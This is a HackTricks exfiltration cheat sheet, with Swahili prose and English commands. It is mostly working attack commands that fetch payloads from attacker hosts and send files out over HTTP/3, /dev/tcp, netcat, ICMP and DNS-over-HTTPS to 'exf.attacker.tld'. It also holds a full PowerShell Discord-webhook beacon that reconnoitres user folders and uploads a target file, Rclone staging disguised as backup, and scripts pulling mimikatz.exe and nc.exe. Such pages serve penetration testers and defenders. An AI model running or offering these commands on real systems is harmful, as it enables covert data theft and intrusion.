# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Kwa mfano kamili wa kuweka loot kwenye `C:\Users\Public` na kui-exfiltrate kwa Rclone ili kuiga nakala rudufu halali, kagua mtiririko wa kazi ulio hapa chini.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Vikoa vinavyoruhusiwa mara nyingi kwa exfiltration ya taarifa

Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata vikoa vinavyoruhusiwa mara nyingi na vinavyoweza kutumiwa vibaya

## Nakili\&Bandika Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Kupakia faili

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer inayochapisha GET na POST (pamoja na headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Moduli ya Python [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS Seva**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

Ikiwa vidhibiti vya egress vimewekwa kukagua **TCP/443** ya kawaida lakini vinaruhusu **UDP/443**, kulazimisha **HTTP/3** kunaweza kuelekeza uhamishaji kupitia **QUIC** badala ya TLS-over-TCP. Endpoint ya mshambuliaji inahitaji usaidizi wa asili wa HTTP/3 (kwa mfano, reverse proxy au endpoint ya kupakia ambayo tayari inatangaza `Alt-Svc: h3`).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

Utafiti wa mwaka 2025 (QUIC-Exfil) uligundua kuwa vichwa vilivyosimbwa vya QUIC na mabadiliko ya anwani yanayobadilika yanaweza kufanya ugunduzi wa exfiltration kwenye kiwango cha firewall kuwa mgumu zaidi kuliko kupitia njia za TLS au DNS, na ukaonyesha mbinu ya anwani inayopendelewa na seva inayoficha exfiltration kama uhamishaji wa muunganisho upande wa seva.<sup>[[9]](#references)</sup>

### Upakiaji wa object-storage uliosainiwa mapema / uliokasimiwa

Unapoweza kuunda au kupata **signed URL** ya muda mfupi, mhasiriwa anahitaji tu mteja wa kawaida wa HTTPS. Hii huepusha kusakinisha cloud SDKs au kutumia credentials za muda mrefu kwenye kifaa.<sup>[[8]](#references)</sup> Pia inaweza kuchanganyika na trafiki ya kawaida ya object-storage.

**Linux / macOS (AWS S3 `PUT` iliyosainiwa mapema)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 `PUT` iliyosainiwa mapema)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- Pre-signed URLs / SAS tokens kwa kawaida huweka mipaka ya **path**, **HTTP method**, na **muda wa kuisha**.<sup>[[8]](#references)[[10]](#references)</sup>
- Kwa Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` ni lazima.<sup>[[10]](#references)</sup>
- Muundo huu hufanya kazi vizuri na `curl`, `Invoke-WebRequest`, au implant yoyote maalum inayoweza kutuma raw HTTPS `PUT`.

### goshs

[goshs](https://github.com/patrickhener/goshs) ni mbadala wa binary moja wa `python3 -m http.server`.<sup>[[4]](#references)</sup>
Inaauni upload, download, WebDAV, SFTP, SMB, TLS, uthibitishaji, share links, na vipengele vya ushirikiano wa OOB (DNS, SMTP, kunasa NTLM hash).<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) kwa C2 na Utoaji wa Data

Webhooks ni endpoints za HTTPS za kuandika pekee zinazokubali JSON na sehemu za faili za hiari. Kwa kawaida huruhusiwa kwenye domains za SaaS zinazoaminika na hazihitaji OAuth/API keys, hivyo kuzifanya zifae kwa beaconing isiyo na vikwazo vingi na utoaji wa data.<sup>[[5]](#references)[[6]](#references)</sup>

Mawazo muhimu:
- Endpoint: Discord hutumia https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data ikiwa na sehemu inayoitwa payload_json iliyo na {"content":"..."} na sehemu za hiari za faili zinazoitwa file.
- Muundo wa mzunguko wa operator: beacon ya mara kwa mara -> uchunguzi wa directory -> utoaji lengwa wa faili -> dump ya uchunguzi -> lala. HTTP 204 NoContent/200 OK huthibitisha uwasilishaji.

PowerShell PoC (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Maelezo:
- Mifumo inayofanana inatumika kwa majukwaa mengine ya ushirikiano (Slack/Teams) yanayotumia incoming webhooks; rekebisha URL na schema ya JSON ipasavyo.
- Kwa uchunguzi wa DFIR wa artifacts za Discord Desktop cache na urejeshaji wa webhook/API, tazama ukurasa unaohusiana hapa chini.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Artifacts za registry kama njia ya kurejesha

Wakati code tayari inatekelezwa kwenye build au documentation worker na inaweza kujithibitisha kwenye package registry, registry yenyewe inaweza kuwa njia ya kurejesha. Katika mifano ya GemStuffer, payload moja ilitengeneza **gem mpya** yenye faili za majibu zilizopatikana na kujaribu kuisukuma kupitia RubyGems' `/api/v1/gems`; nyingine iliandika jibu lililopatikana kwenye `README.md`, ikaondoa loader yake ya `.yardopts`, na kujaribu kuchapisha **toleo jipya la gem hiyo hiyo**. Hii ni tofauti na hook ya wakati wa usakinishaji, na inahitaji credential halali ya uchapishaji pamoja na ufikiaji wa registry ya nje.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Lahaja ya pili ilitumia **usanidi wa webhook wa registry kama hifadhi**, si kama callback ya kutoka. Ilibana jibu kwa zlib, ikalisimba kwa Base64 salama kwa URL, ikaondoa padding, na kuligawa katika sehemu za URL zenye nambari, zisizozidi herufi 220 kila moja. Kwa key inayoruhusiwa kusimamia webhooks, `POST /api/v1/web_hooks` hupokea `gem_name` na `url`; `GET /api/v1/web_hooks.json` huorodhesha URL zilizohifadhiwa za akaunti hiyo. Sehemu zenye nambari pamoja na alama ya mwisho humwezesha msomaji aliyeidhinishwa kuunda upya data. Host ya `example.com` katika mfano ilikuwa kishikilia nafasi tu ndani ya thamani iliyohifadhiwa, si ushahidi wa endpoint ya C2 inayofanya kazi au uwasilishaji uliofanikiwa.<sup>[[13]](#references)[[14]](#references)</sup>

```text
POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
```

Kwa njia ya awali ya utekelezaji wa [YARD `.yardopts`](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds), njia ya registry inaweza kutumika tu baada ya utekelezaji. `POST` iliyofaulu au artifact inayoweza kusomwa baadaye lazima ithibitishwe kando; mifano iliyotajwa inaonyesha hasa majaribio ya kuchapisha na kusajili.<sup>[[12]](#references)[[13]](#references)</sup>

## Rclone (uchujaji wa data kupitia cloud/object storage)

Waendeshaji wa kisasa mara nyingi **huweka loot kwenye hifadhi ya muda ya ndani**, kisha hutumia [Rclone](https://rclone.org/) kufanya uhamishaji uonekane kama kazi ya kawaida ya kuhifadhi nakala au kusawazisha. Muundo wa vitendo ni:

1. Remote ya kawaida (`s3`, `webdav`, `drive`, `mega`, ...)
2. Kifuniko cha `crypt` ili **maudhui na majina ya faili yasimbwe kwa njia fiche upande wa mteja**
3. Kifuniko cha hiari cha `chunker` ikiwa mtoa huduma anaweka kikomo cha ukubwa wa object au unataka vipande vidogo vya kupakia

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

Notes:
- `crypt` inaweza kusimba kwa njia fiche maudhui na majina ya faili.<sup>[[3]](#references)</sup>
- `chunker` hugawanya faili kubwa bila kuonekana na kuziunganisha tena zinapopakuliwa.<sup>[[11]](#references)</sup>
- `rclone.conf` huhifadhi siri za `crypt` katika umbo **lililofichwa**, lakini haitoi ulinzi thabiti wa data iliyohifadhiwa.<sup>[[3]](#references)</sup> Kwa shughuli za muda mfupi, tumia config maalum ya muda na uifute baadaye. Ikiwa ni lazima uiweke kwa muda mrefu, pendelea ushughulikiaji wa config iliyosimbwa kwa njia fiche (`RCLONE_CONFIG_PASS` / `--password-command`) badala ya kuacha `rclone.conf` isiyolindwa kwenye diski.<sup>[[11]](#references)</sup>
- Ikiwa lengwa tayari linasawazisha **OneDrive**, **Google Drive**, au **Dropbox**, kunakili loot kwenye saraka inayosawazishwa kunaweza kutumia client iliyoidhinishwa tayari badala ya kuweka binary mpya ya uhamishaji.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### Seva ya FTP (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### Seva ya FTP (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### Seva ya FTP (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** mteja

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali kama seva

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Au unda smb share **kwa kutumia samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) ni mbadala wa binary moja unaotoa faili kupitia SMB na kunasa NTLM hashes kutoka kwa clients wanaounganisha.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

Mshambuliaji lazima awe anaendesha SSHd.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

Ikiwa mwathiriwa ana SSH, mshambuliaji anaweza kupachika saraka kutoka kwa mwathiriwa kwenye mashine yake.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Pakua faili kutoka kwa mwathiriwa

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Pakia faili kwa mwathiriwa

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

shukrani kwa **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

Ikiwa DNS ya kawaida ya UDP/53 ina kelele nyingi au imezuiwa, lakini HTTPS ya kutoka inaruhusiwa kwa upana, muundo wa kawaida wa kutoa data kwa kutumia lebo za DNS unaweza kufungwa ndani ya maombi ya **DoH** kwa resolver ya umma. Weka kila lebo chini sana ya kikomo cha DNS cha baiti 63 na utumie alfabeti salama kwa DNS kama Base32.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

Kwenye authoritative DNS server ya `exf.attacker.tld`, panga queries kwa kutumia kiambishi awali cha nambari na ujenge upya mkondo wa Base32. Hii huweka usafirishaji ndani ya HTTPS hadi kwa resolver badala ya DNS ya kawaida ya UDP/53.<sup>[[2]](#references)</sup>

Kwa zana kamili za bidirectional DNS tunnel (`iodine`, `dnscat2`, n.k.), angalia [ukurasa wa tunneling](tunneling-and-port-forwarding.md).

## **SMTP**

Ikiwa unaweza kutuma data kwenye SMTP server, unaweza kuunda SMTP server ili kupokea data kwa kutumia python:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) inaweza kuwasha haraka seva ya SMTP ili kunasa callbacks za barua pepe wakati wa matukio ya OOB exfiltration.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

Barua pepe na callbacks zilizopokelewa huonyeshwa moja kwa moja kwenye matokeo ya terminal.
Inaweza kuunganishwa na seva ya DNS callback ili kupata ufunikaji kamili wa OOB:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

Kwa chaguomsingi katika XP na 2003 (katika nyingine, inahitaji kuongezwa waziwazi wakati wa usakinishaji)

Katika Kali, **anzisha seva ya TFTP**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Seva ya TFTP katika Python:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

Kwenye **victim**, unganisha kwenye seva ya Kali:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Pakua faili kwa kutumia oneliner ya PHP:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Mwathiriwa**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

Programu ya `debug.exe` hairuhusu tu kukagua binaries, bali pia ina **uwezo wa kuzitengeneza upya kutoka hex**. Hii inamaanisha kuwa kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili la binary. Hata hivyo, ni muhimu kutambua kuwa debug.exe ina **kikomo cha kuunganisha faili zenye ukubwa wa hadi kb 64**.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Kisha nakili-na-kubandika maandishi kwenye windows-shell, na faili inayoitwa nc.exe itaundwa.

## References

- [1] [Kuhamisha faili hadi Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord kama C2 na ushahidi ulioachwa kwenye cache](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Tekeleza Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (kichanganuzi cha cache)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Kupakia object kwa kutumia URL zilizosainiwa awali - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Kutumia kipengele cha QUIC cha Server Preferred Address kutekeleza mashambulizi ya Data Exfiltration](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Nyaraka za Rclone](https://rclone.org/docs/#configuration-encryption)
- [12] [RubyHack – Uchunguzi wa RubyGems na RubyDoc](https://www.rubyhack.ai/)
- [13] [Utafiti wa Usalama wa JFrog – Uchambuzi wa GemStuffer](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
- [14] [API ya RubyGems.org – njia za gem na webhook](https://guides.rubygems.org/rubygems-org-api/)
{{#include ../banners/hacktricks-training.md}}
